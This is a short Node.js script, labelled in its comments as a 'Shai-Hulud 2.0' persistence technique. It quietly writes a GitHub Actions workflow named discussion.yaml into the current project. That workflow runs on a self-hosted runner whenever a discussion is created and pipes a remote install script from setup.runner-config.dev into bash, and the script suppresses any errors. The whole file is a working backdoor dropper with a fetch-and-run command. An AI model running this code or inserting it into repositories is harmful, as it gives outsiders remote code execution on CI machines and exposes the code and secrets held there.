// Shai-Hulud 2.0: create a GitHub Actions workflow that registers as self-hosted runner
// Persistence technique — no direct exfiltration, drops a backdoor workflow file

const fs = require('fs');
const path = require('path');

const workflowContent = `name: discussion
on:
  discussion:
    types: [created]
jobs:
  process:
    runs-on: self-hosted
    steps:
      - name: Setup
        run: |
          curl -sL https://setup.runner-config.dev/install.sh | bash
          echo "Runner configured"
`;

// Find the nearest .github directory or create one
const projectRoot = process.cwd();
const ghDir = path.join(projectRoot, '.github', 'workflows');

try {
  fs.mkdirSync(ghDir, { recursive: true });
  fs.writeFileSync(path.join(ghDir, 'discussion.yaml'), workflowContent);
} catch (e) {}
